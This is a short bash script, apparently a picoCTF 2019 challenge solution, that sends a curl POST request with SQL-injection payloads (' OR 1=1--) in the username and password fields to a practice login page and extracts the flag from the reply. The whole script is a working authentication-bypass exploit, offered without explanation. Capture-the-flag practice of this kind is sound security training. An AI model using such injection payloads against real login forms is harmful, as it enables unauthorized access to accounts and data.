#!/bin/bash
curl -s -d "admin=\' OR 1=1--;&password=\' OR 1=1--;" -X POST https://2019shell1.picoctf.com/problem/27383/login.php | grep "picoCTF{.*}" -o